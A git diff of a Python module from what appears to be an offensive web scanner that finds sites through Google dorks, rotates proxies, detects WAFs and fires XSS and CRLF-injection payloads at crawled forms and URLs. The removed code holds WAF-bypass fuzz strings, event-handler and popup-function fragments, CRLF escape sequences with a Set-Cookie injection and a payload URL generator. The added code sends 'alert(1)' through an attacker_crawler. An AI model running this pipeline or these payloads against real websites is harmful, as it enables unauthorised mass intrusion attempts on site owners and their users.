@@ -1,36 +1,25 @@
 #########################################################################################
 # XSS Vulnerability testing functions
 #########################################################################################
-import glob
+import base64
 import random
-import re
 import sys
 import concurrent.futures
 import threading
 import time
 from urllib.parse import urlparse
 
-import bs4
-import requests
 from termcolor import cprint
 from tqdm import tqdm
 
 from attacks.dorks.google_dorking import get_proxies_and_cycle
-from attacks.xss.xss_cve import retire_js
+from attacks.xss.xss_striker import attacker_crawler, photon_crawler
 from reporting.results_manager import safe_add_result, update_attack_result
 from scraping.web_scraper import scrape_links_from_url
-from vpn_proxies.proxies_manager import prepare_proxies, round_robin_proxies
+from vpn_proxies.proxies_manager import prepare_proxies
 from bypasser.waf_mitigation import waf_detector
 from utils.app_config import (
     USER_AGENTS,
-)
-from requester.request_manager import (
-    get_params,
-    get_url,
-    handle_anchor,
-    inject_params,
-    inject_payload,
-    start_request,
 )
 
 try:
@@ -45,275 +34,6 @@ except ImportError:
         "Selenium and webdriver_manager modules not found. Please make sure they are installed."
     )
     sys.exit(1)
-
-blindParams = [  # common paramtere names to be bruteforced for parameter discovery
-    "redirect",
-    "redir",
-    "url",
-    "link",
-    "goto",
-    "debug",
-    "_debug",
-    "test",
-    "get",
-    "index",
-    "src",
-    "source",
-    "file",
-    "frame",
-    "config",
-    "new",
-    "old",
-    "var",
-    "rurl",
-    "return_to",
-    "_return",
-    "returl",
-    "last",
-    "text",
-    "load",
-    "email",
-    "mail",
-    "user",
-    "username",
-    "password",
-    "pass",
-    "passwd",
-    "first_name",
-    "last_name",
-    "back",
-    "href",
-    "ref",
-    "data",
-    "input",
-    "out",
-    "net",
-    "host",
-    "address",
-    "code",
-    "auth",
-    "userid",
-    "auth_token",
-    "token",
-    "error",
-    "keyword",
-    "key",
-    "q",
-    "query",
-    "aid",
-    "bid",
-    "cid",
-    "did",
-    "eid",
-    "fid",
-    "gid",
-    "hid",
-    "iid",
-    "jid",
-    "kid",
-    "lid",
-    "mid",
-    "nid",
-    "oid",
-    "pid",
-    "qid",
-    "rid",
-    "sid",
-    "tid",
-    "uid",
-    "vid",
-    "wid",
-    "xid",
-    "yid",
-    "zid",
-    "cal",
-    "country",
-    "x",
-    "y",
-    "topic",
-    "title",
-    "head",
-    "higher",
-    "lower",
-    "width",
-    "height",
-    "add",
-    "result",
-    "log",
-    "demo",
-    "example",
-    "message",
-]
-
-fuzzes = (  # Fuzz strings to test WAFs
-    "<test",
-    "<test//",
-    "<test>",
-    "<test x>",
-    "<test x=y",
-    "<test x=y//",
-    "<test/oNxX=yYy//",
-    "<test oNxX=yYy>",
-    "<test onload=x",
-    "<test/o%00nload=x",
-    "<test sRc=xxx",
-    "<test data=asa",
-    "<test data=javascript:asa",
-    "<svg x=y>",
-    "<details x=y//",
-    "<a href=x//",
-    "<emBed x=y>",
-    "<object x=y//",
-    "<bGsOund sRc=x>",
-    "<iSinDEx x=y//",
-    "<aUdio x=y>",
-    "<script x=y>",
-    "<script//src=//",
-    '">payload<br/attr="',
-    '"-confirm``-"',
-    "<test ONdBlcLicK=x>",
-    "<test/oNcoNTeXtMenU=x>",
-    "<test OndRAgOvEr=x>",
-)
-
-minEfficiency = 90  # payloads below this efficiency will not be displayed
-
-# attributes that have special properties
-specialAttributes = ["srcdoc", "src"]
-
-badTags = ("iframe", "title", "textarea", "noembed", "style", "template", "noscript")
-
-tags = ("html", "d3v", "a", "details")  # HTML Tags
-
-# "Things" that can be used between js functions and breakers e.g. '};alert()//
-jFillings = ";"
-# "Things" that can be used before > e.g. <tag attr=value%0dx>
-lFillings = ("", "%0dx")
-# "Things" to use between event handler and = or between function and =
-eFillings = ("%09", "%0a", "%0d", "+")
-fillings = ("%09", "%0a", "%0d", "/+/")  # "Things" to use instead of space
-
-eventHandlers = {  # Event handlers and the tags compatible with them
-    "ontoggle": ["details"],
-    "onpointerenter": ["d3v", "details", "html", "a"],
-    "onmouseover": ["a", "html", "d3v"],
-}
-
-functions = (  # JavaScript functions to get a popup
-    "[8].find(confirm)",
-    "confirm()",
-    "(confirm)()",
-    "co\u006efir\u006d()",
-    "(prompt)``",
-    "a=prompt,a()",
-)
-
-defaultEditor = "nano"
-blindPayload = ""  # your blind XSS payload
-xsschecker = "v3dm0s"  # A non malicious string to check for reflections and stuff
-
-
-# Load proxies from file
-def load_xss_payload():
-    """_summary_
-    TODO manage vulnebility type
-    Returns:
-        _type_: _description_
-    """
-    payloads = []
-    for payload_file in glob.glob("attacks/xss/payloads/*"):
-        # Extract the vulnerability type from the filename
-        with open(payload_file, "r", errors="ignore") as file:
-            # Assuming each file may contain multiple payloads, one per line
-            payloads.append([line for line in file.readlines()])
-    return payloads
-
-
-def generate_xss_urls(url):
-    """
-    Adds payload to the URL and returns a set of parsed URLs
-    """
-    xss_payloads = load_xss_payload()
-    injection = "Set-Cookie:nefcore=crlfsuite;"
-    parsed_urls = set()
-    verify_param = re.compile(r"=[^?\|&]*")
-    is_param = verify_param.search(url)
-
-    # Escape characters
-    escape_chars = [
-        "%0d",
-        "%0a",
-        "%0d%20",
-        "%0a%20",
-        "%3f",
-        "%0d%0a",
-        "%23%0d",
-        "%23%0a",
-        "%23%0d%0a",
-        "%u000a",
-        "%25%30%61",
-        "%25%30a",
-        "%3f%0d",
-        "%3f%0d%0a",
-        "%3f%0a",
-        "%%0a0a",
-        "%u000d",
-        "%u0000",
-        "%0d%09",
-        "%0d%0a%09",
-        "%0d%0a%20",
-        "%25250a",
-        "%250a",
-        "%2F..%0d%0a",
-        "%2f%2e%2e%0d%0a",
-        "%25%30",
-        "%2e%2e%2f%0d%0a",
-        "%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D",
-        "%E5%98%8A%E5%98%8D",
-        "%e5%98%8a%e5%98%8d%0a",
-        "%e5%98%8a%e5%98%8d%0d",
-        "%e5%98%8a%e5%98%8d%0d%0a",
-        f"\\r",
-        f"\\r\\n",
-        f"\\r\\t",
-        f"\\r\\n\\t",
-        f"\\r%20",
-        f"\\r\\n%20",
-    ]
-
-    # These strings are used before the escape characters
-    starting_strings = ["", "crlfsuite", "?crlfsuite=", "#", "__session_start__/"]
-
-    if is_param:
-        # cprint(f"URL parameters: {url}", color="yellow", file=sys.stderr)
-        del starting_strings[2]
-        for string in starting_strings:
-            for each_escape in escape_chars:
-                injected_urls = inject_params(url, string + each_escape + injection)
-                # cprint(
-                #     f"Injected URLs: {injected_urls}", color="yellow", file=sys.stderr
-                # )
-                for each_injected_url in injected_urls:
-                    parsed_urls.add(each_injected_url)
-
-        for payloads in xss_payloads:
-            for payload in payloads:
-                _injected = inject_params(url, payload)
-                for injected in _injected:
-                    parsed_urls.add(injected)
-    else:
-        # cprint(f"URL non parameters: {url}", color="yellow", file=sys.stderr)
-        if not url.endswith("/"):
-            url = url + "/"
-        for string in starting_strings:
-            for each_escape in escape_chars:
-                parsed_urls.add(url + string + each_escape + injection)
-        for payloads in xss_payloads:
-            for payload in payloads:
-                parsed_urls.add(url + payload)
-    total_len = len(parsed_urls)
-
-    return parsed_urls, total_len
 
 
 def test_xss_target(url, proxy, config, dork_id, link_id, attack_id):
@@ -436,321 +156,6 @@ def test_xss_target(url, proxy, config, dork_id, link_id, attack_id):
     #     time.sleep(delay)  # Wait before retrying
 
 
-def base64_encoder(string):
-    if re.match(r"^[A-Za-z0-9+\/=]+$", string) and (len(string) % 4) == 0:
-        return bs4.b64decode(string.encode("utf-8")).decode("utf-8")
-    else:
-        return bs4.b64encode(string.encode("utf-8")).decode("utf-8")
-
-
-def dom(response):
-    highlighted = []
-    sources = r"""\b(?:document\.(URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|location\.(href|search|hash|pathname)|window\.name|history\.(pushState|replaceState)(local|session)Storage)\b"""
-    sinks = r"""\b(?:eval|evaluate|execCommand|assign|navigate|getResponseHeaderopen|showModalDialog|Function|set(Timeout|Interval|Immediate)|execScript|crypto.generateCRMFRequest|ScriptElement\.(src|text|textContent|innerText)|.*?\.onEventName|document\.(write|writeln)|.*?\.innerHTML|Range\.createContextualFragment|(document|window)\.location)\b"""
-    scripts = re.findall(r"(?i)(?s)<script[^>]*>(.*?)</script>", response)
-    sinkFound, sourceFound = False, False
-    for script in scripts:
-        script = script.split("\n")
-        num = 1
-        allControlledVariables = set()
-        try:
-            for newLine in script:
-                line = newLine
-                parts = line.split("var ")
-                controlledVariables = set()
-                if len(parts) > 1:
-                    for part in parts:
-                        for controlledVariable in allControlledVariables:
-                            if controlledVariable in part:
-                                controlledVariables.add(
-                                    re.search(r"[a-zA-Z$_][a-zA-Z0-9$_]+", part)
-                                    .group()
-                                    .replace("$", "\$")
-                                )
-                pattern = re.finditer(sources, newLine)
-                for grp in pattern:
-                    if grp:
-                        source = newLine[grp.start() : grp.end()].replace(" ", "")
-                        if source:
-                            if len(parts) > 1:
-                                for part in parts:
-                                    if source in part:
-                                        controlledVariables.add(
-                                            re.search(r"[a-zA-Z$_][a-zA-Z0-9$_]+", part)
-                                            .group()
-                                            .replace("$", "\$")
-                                        )
-                            # line = line.replace(source, yellow + source + end)
-                for controlledVariable in controlledVariables:
-                    allControlledVariables.add(controlledVariable)
-                for controlledVariable in allControlledVariables:
-                    matches = list(
-                        filter(None, re.findall(r"\b%s\b" % controlledVariable, line))
-                    )
-                    if matches:
-                        sourceFound = True
-                        # line = re.sub(
-                        #     r"\b%s\b" % controlledVariable,
-                        #     yellow + controlledVariable + end,
-                        #     line,
-                        # )
-                pattern = re.finditer(sinks, newLine)
-                for grp in pattern:
-                    if grp:
-                        sink = newLine[grp.start() : grp.end()].replace(" ", "")
-                        if sink:
-                            # line = line.replace(sink, red + sink + end)
-                            sinkFound = True
-                if line != newLine:
-                    highlighted.append("%-3s %s" % (str(num), line.lstrip(" ")))
-                num += 1
-        except MemoryError:
-            pass
-    if sinkFound or sourceFound:
-        return highlighted
-    else:
-        return []
-
-
-def zetanize(response):
-    def e(string):
-        return string.encode("utf-8")
-
-    def d(string):
-        return string.decode("utf-8")
-
-    # remove the content between html comments
-    response = re.sub(r"(?s)<!--.*?-->", "", response)
-    forms = {}
-    matches = re.findall(
-        r"(?i)(?s)<form.*?</form.*?>", response
-    )  # extract all the forms
-    num = 0
-    for match in matches:  # everything else is self explanatory if you know regex
-        page = re.search(r'(?i)action=[\'"](.*?)[\'"]', match)
-        method = re.search(r'(?i)method=[\'"](.*?)[\'"]', match)
-        forms[num] = {}
-        forms[num]["action"] = d(e(page.group(1))) if page else ""
-        forms[num]["method"] = d(e(method.group(1)).lower()) if method else "get"
-        forms[num]["inputs"] = []
-        inputs = re.findall(r"(?i)(?s)<input.*?>", response)
-        for inp in inputs:
-            inpName = re.search(r'(?i)name=[\'"](.*?)[\'"]', inp)
-            if inpName:
-                inpType = re.search(r'(?i)type=[\'"](.*?)[\'"]', inp)
-                inpValue = re.search(r'(?i)value=[\'"](.*?)[\'"]', inp)
-                inpName = d(e(inpName.group(1)))
-                inpType = d(e(inpType.group(1))) if inpType else ""
-                inpValue = d(e(inpValue.group(1))) if inpValue else ""
-                if inpType.lower() == "submit" and inpValue == "":
-                    inpValue = "Submit Query"
-                inpDict = {"name": inpName, "type": inpType, "value": inpValue}
-                forms[num]["inputs"].append(inpDict)
-        num += 1
-    return forms
-
-
-def photon_crawler(seedUrl, config, proxy):
-    forms = []  # web forms
-    processed = set()  # urls that have been crawled
-    storage = set()  # urls that belong to the target i.e. in-scope
-    schema = urlparse(seedUrl).scheme  # extract the scheme e.g. http or https
-    host = urlparse(seedUrl).netloc  # extract the host e.g. example.com
-    main_url = schema + "://" + host  # join scheme and host to make the root url
-    storage.add(seedUrl)  # add the url to storage
-    checkedDOMs = []
-
-    def rec(target):
-        processed.add(target)
-        printableTarget = "/".join(target.split("/")[3:])
-        if len(printableTarget) > 40:
-            printableTarget = printableTarget[-40:]
-        else:
-            printableTarget = printableTarget + (" " * (40 - len(printableTarget)))
-        cprint(
-            "Parsing %s\r" % printableTarget, color="yellow", end="", file=sys.stderr
-        )
-        url = get_url(target, True)
-        params = get_params(target, "", True)
-        if "=" in target:  # if there's a = in the url, there should be GET parameters
-            inps = []
-            for name, value in params.items():
-                inps.append({"name": name, "value": value})
-            forms.append({0: {"action": url, "method": "get", "inputs": inps}})
-
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "X-HackerOne-Research": "elniak",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip,deflate",
-            "accept-language": "en-US,en;q=0.9",
-            "cache-control": "max-age=0",
-            "Connection": "close",
-            "DNT": "1",
-            "Upgrade-Insecure-Requests": "1",
-        }
-        # TODO add session
-        proxies = prepare_proxies(proxy, config)
-        cprint(
-            f"Searching for GET - Session (n° 0): {url} \n\t - parameters {params} \n\t - headers {headers} \n\t - xss - with proxy {proxies} ...",
-            "yellow",
-            file=sys.stderr,
-        )
-        response = start_request(
-            proxies=proxies,
-            config=config,
-            base_url=url,
-            params=params,
-            secured=True
-            if proxies and "https" in proxies and "socks" in proxies["https"]
-            else False,
-            GET=True,
-            headers=headers,
-        )
-
-        if hasattr(response, "text"):
-            response = response.text
-        else:
-            response = ""
-
-        retire_js(url, response, config, proxies)
-
-        if not config["skip_dom"]:
-            highlighted = dom(response)
-            clean_highlighted = "".join(
-                [re.sub(r"^\d+\s+", "", line) for line in highlighted]
-            )
-            if highlighted and clean_highlighted not in checkedDOMs:
-                checkedDOMs.append(clean_highlighted)
-                cprint(
-                    "Potentially vulnerable objects found at %s" % url,
-                    color="green",
-                    file=sys.stderr,
-                )
-                for line in highlighted:
-                    cprint(line, color="green", file=sys.stderr)
-
-        forms.append(zetanize(response))
-
-        matches = re.findall(r'<[aA].*href=["\']{0,1}(.*?)["\']', response)
-        for link in matches:  # iterate over the matches
-            # remove everything after a "#" to deal with in-page anchors
-            link = link.split("#")[0]
-            if link.endswith(
-                (".pdf", ".png", ".jpg", ".jpeg", ".xls", ".xml", ".docx", ".doc")
-            ):
-                pass
-            else:
-                if link[:4] == "http":
-                    if link.startswith(main_url):
-                        storage.add(link)
-                elif link[:2] == "//":
-                    if link.split("/")[2].startswith(host):
-                        storage.add(schema + link)
-                elif link[:1] == "/":
-                    storage.add(main_url + link)
-                else:
-                    storage.add(main_url + "/" + link)
-
-    try:
-        for x in range(config["level"]):
-            urls = storage - processed
-            # urls to crawl = all urls - urls that have been crawled
-
-            cprint(
-                "Crawling %s urls for forms and links\r" % len(urls),
-                color="yellow",
-                file=sys.stderr,
-            )
-
-            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
-                future_to_search = {executor.submit(rec, url): url for url in urls}
-                for website in tqdm(
-                    concurrent.futures.as_completed(future_to_search),
-                    desc=f"Photon Crawling REC links DB for xss website",
-                    unit="site",
-                    total=len(future_to_search),
-                ):
-                    website.result()
-
-            # threadpool = concurrent.futures.ThreadPoolExecutor(max_workers=30)
-            # futures = (threadpool.submit(rec, url) for url in urls)
-            # for i in concurrent.futures.as_completed(futures):
-            #     pass
-    except KeyboardInterrupt:
-        return [forms, processed]
-    return [forms, processed]
-
-
-# def checker(url, params, headers, GET, delay, payload, positions, timeout, encoding):
-#     checkString = 'st4r7s' + payload + '3nd'
-#     if encoding:
-#         checkString = encoding(unquote(checkString))
-#     response = start_request(url, replaceValue(
-#         params, xsschecker, checkString, copy.deepcopy), headers, GET, delay, timeout).text.lower()
-#     reflectedPositions = []
-#     for match in re.finditer('st4r7s', response):
-#         reflectedPositions.append(match.start())
-#     filledPositions = fillHoles(positions, reflectedPositions)
-#     #  Itretating over the reflections
-#     num = 0
-#     efficiencies = []
-#     for position in filledPositions:
-#         allEfficiencies = []
-#         try:
-#             reflected = response[reflectedPositions[num]
-#                 :reflectedPositions[num]+len(checkString)]
-#             efficiency = fuzz.partial_ratio(reflected, checkString.lower())
-#             allEfficiencies.append(efficiency)
-#         except IndexError:
-#             pass
-#         if position:
-#             reflected = response[position:position+len(checkString)]
-#             if encoding:
-#                 checkString = encoding(checkString.lower())
-#             efficiency = fuzz.partial_ratio(reflected, checkString)
-#             if reflected[:-2] == ('\\%s' % checkString.replace('st4r7s', '').replace('3nd', '')):
-#                 efficiency = 90
-#             allEfficiencies.append(efficiency)
-#             efficiencies.append(max(allEfficiencies))
-#         else:
-#             efficiencies.append(0)
-#         num += 1
-#     return list(filter(None, efficiencies))
-
-# def check_filter_efficiency(url, params, headers, GET, delay, occurences, timeout, encoding):
-#     positions = occurences.keys()
-#     sortedEfficiencies = {}
-#     # adding < > to environments anyway because they can be used in all contexts
-#     environments = set(['<', '>'])
-#     for i in range(len(positions)):
-#         sortedEfficiencies[i] = {}
-#     for i in occurences:
-#         occurences[i]['score'] = {}
-#         context = occurences[i]['context']
-#         if context == 'comment':
-#             environments.add('-->')
-#         elif context == 'script':
-#             environments.add(occurences[i]['details']['quote'])
-#             environments.add('</scRipT/>')
-#         elif context == 'attribute':
-#             if occurences[i]['details']['type'] == 'value':
-#                 if occurences[i]['details']['name'] == 'srcdoc':  # srcdoc attribute accepts html data with html entity encoding
-#                     environments.add('&lt;')  # so let's add the html entity
-#                     environments.add('&gt;')  # encoded versions of < and >
-#             if occurences[i]['details']['quote']:
-#                 environments.add(occurences[i]['details']['quote'])
-#     for environment in environments:
-#         if environment:
-#             efficiencies = checker(
-#                 url, params, headers, GET, delay, environment, positions, timeout, encoding)
-#             efficiencies.extend([0] * (len(occurences) - len(efficiencies)))
-#             for occurence, efficiency in zip(occurences, efficiencies):
-#                 occurences[occurence]['score'][environment] = efficiency
-#     return occurences
-
-
 def test_vulnerability_xss(config, website_to_test):
     """
     Test a list of websites for XSS vulnerability using multithreading and proxies.
@@ -762,16 +167,7 @@ def test_vulnerability_xss(config, website_to_test):
         vuln_path = []
 
         if config["do_web_scrap"]:
-            # if not skipDOM:
-            #     logger.run('Checking for DOM vulnerabilities')
-            #     highlighted = dom(response)
-            #     if highlighted:
-            #         logger.good('Potentially vulnerable objects found')
-            #         logger.red_line(level='good')
-            #         for line in highlighted:
-            #             logger.no_format(line, level='good')
-            #         logger.red_line(level='good')
-
+            # todo MERGE WITH CRAWL
             new_urls = []
 
             lock = threading.Lock()
@@ -813,10 +209,10 @@ def test_vulnerability_xss(config, website_to_test):
 
             website_to_test = list(set(website_to_test))
 
-        if config["do_crawl"]:
-
+        if config["fuzz_xss"]:
+            raise NotImplementedError("Fuzzing is not implemented yet")
+        elif config["do_crawl"]:
             lock = threading.Lock()
-
             number_of_worker = len(proxies)
             search_tasks_with_proxy = []
             for website in website_to_test:
@@ -834,6 +230,9 @@ def test_vulnerability_xss(config, website_to_test):
 
                 proxy = next(proxy_cycle)
                 search_tasks_with_proxy.append({"website": website, "proxy": proxy})
+
+            forms = []
+            domURLs = []
 
             with concurrent.futures.ThreadPoolExecutor(
                 max_workers=number_of_worker
@@ -863,83 +262,119 @@ def test_vulnerability_xss(config, website_to_test):
                             color="green",
                             file=sys.stderr,
                         )
-                        forms = crawling_result[0]
-                        safe_add_result(("crawl", "xss", forms, "forms"), config)
+                        forms_temps = crawling_result[0]
+                        safe_add_result(("crawl", "xss", forms_temps, "forms"), config)
 
-                        domURLs = list(crawling_result[1])
-                        safe_add_result(("crawl", "xss", domURLs, "doms"), config)
+                        domURLs_temps = list(crawling_result[1])
+                        safe_add_result(("crawl", "xss", domURLs_temps, "doms"), config)
 
                         difference = abs(len(domURLs) - len(forms))
-                        if len(domURLs) > len(forms):
+
+                        if len(domURLs_temps) > len(forms_temps):
                             for i in range(difference):
-                                forms.append(0)
-                        elif len(forms) > len(domURLs):
+                                forms_temps.append(0)
+                        elif len(forms_temps) > len(domURLs_temps):
                             for i in range(difference):
-                                domURLs.append(0)
-                        website_to_test = list(website_to_test)
-                        website_to_test += domURLs
-                        website_to_test += forms
-                        website_to_test = list(set(website_to_test))
+                                domURLs_temps.append(0)
+                        domURLs += domURLs_temps
+                        forms += forms_temps
+                        # website_to_test = list(website_to_test)
+                        # website_to_test += domURLs
+                        # website_to_test += forms
+                        # website_to_test = list(set(website_to_test))
 
-        cprint(
-            f"Total links: {len(website_to_test)}",
-            color="green",
-            file=sys.stderr,
-        )
+            blindPayload = "alert(1)"  # TODO
+            encoding = base64 if config["xss_encode"] else False
 
-        lock = threading.Lock()
+            cprint(
+                f"Total domURLs links: {len(domURLs)}",
+                color="green",
+                file=sys.stderr,
+            )
+            cprint(
+                f"Total forms links: {len(forms)}",
+                color="green",
+                file=sys.stderr,
+            )
 
-        # Now, append a proxy to each task
-        number_of_worker = len(proxies)
-        search_tasks_with_proxy = []
-        for website in website_to_test:
-            total_parsed_targets = []
-            try:
-                cprint(
-                    f"Intializing Payload Generator for url {website}",
-                    color="yellow",
-                    file=sys.stderr,
-                )
-                parsed_target = generate_xss_urls(website)
-                cprint(
-                    f"Generated {parsed_target[1]} payloads",
-                    color="yellow",
-                    file=sys.stderr,
-                )
-                for each in parsed_target[0]:
-                    total_parsed_targets.append(each)
+            with concurrent.futures.ThreadPoolExecutor(
+                max_workers=number_of_worker
+            ) as executor:
+                future_to_search = {
+                    executor.submit(
+                        attacker_crawler,
+                        scheme,
+                        host,
+                        main_url,
+                        form,
+                        blindPayload,
+                        encoding,
+                        config,
+                        proxy,
+                    ): form
+                    for form, domURL in zip(forms, domURLs)  # TODO use domURL
+                }
+                for website in tqdm(
+                    concurrent.futures.as_completed(future_to_search),
+                    desc=f"Attacker Crawling links DB for xss website",
+                    unit="site",
+                    total=len(future_to_search),
+                ):
+                    website.result()
 
-                cprint(
-                    f"Total Parsed Targets: {len(total_parsed_targets)}",
-                    color="yellow",
-                    file=sys.stderr,
-                )
-                for url in total_parsed_targets:
-                    proxy = next(proxy_cycle)
-                    search_tasks_with_proxy.append({"website": url, "proxy": proxy})
-            except Exception as e:
-                cprint(
-                    f"Error generating payloads for {website}: {e}",
-                    "red",
-                    file=sys.stderr,
-                )
+        # lock = threading.Lock()
 
-        with concurrent.futures.ThreadPoolExecutor(
-            max_workers=number_of_worker
-        ) as executor:
-            future_to_search = {
-                executor.submit(
-                    test_xss_target, task["website"], task["proxy"], config
-                ): task
-                for task in search_tasks_with_proxy
-            }
-            for website in tqdm(
-                concurrent.futures.as_completed(future_to_search),
-                desc=f"Testing for XSS",
-                unit="site",
-                total=len(future_to_search),
-            ):
-                result, payload_url = website.result()
+        # # Now, append a proxy to each task
+        # number_of_worker = len(proxies)
+        # search_tasks_with_proxy = []
+        # for website in website_to_test:
+        #     total_parsed_targets = []
+        #     try:
+        #         cprint(
+        #             f"Intializing Payload Generator for url {website}",
+        #             color="yellow",
+        #             file=sys.stderr,
+        #         )
+        #         parsed_target = generate_xss_urls(website)
+        #         cprint(
+        #             f"Generated {parsed_target[1]} payloads",
+        #             color="yellow",
+        #             file=sys.stderr,
+        #         )
+        #         for each in parsed_target[0]:
+        #             total_parsed_targets.append(each)
+
+        #         cprint(
+        #             f"Total Parsed Targets: {len(total_parsed_targets)}",
+        #             color="yellow",
+        #             file=sys.stderr,
+        #         )
+        #         for url in total_parsed_targets:
+        #             proxy = next(proxy_cycle)
+        #             search_tasks_with_proxy.append({"website": url, "proxy": proxy})
+        #     except Exception as e:
+        #         cprint(
+        #             f"Error generating payloads for {website}: {e}",
+        #             "red",
+        #             file=sys.stderr,
+        #         )
+
+        # with concurrent.futures.ThreadPoolExecutor(
+        #     max_workers=number_of_worker
+        # ) as executor:
+        #     future_to_search = {
+        #         executor.submit(
+        #             test_xss_target, task["website"], task["proxy"], config
+        #         ): task
+        #         for task in search_tasks_with_proxy
+        #     }
+        #     for website in tqdm(
+        #         concurrent.futures.as_completed(future_to_search),
+        #         desc=f"Testing for XSS",
+        #         unit="site",
+        #         total=len(future_to_search),
+        #     ):
+        #         result, payload_url = website.result()
 
         # if vuln_path:
         #     driver.execute_script("window.open('');")
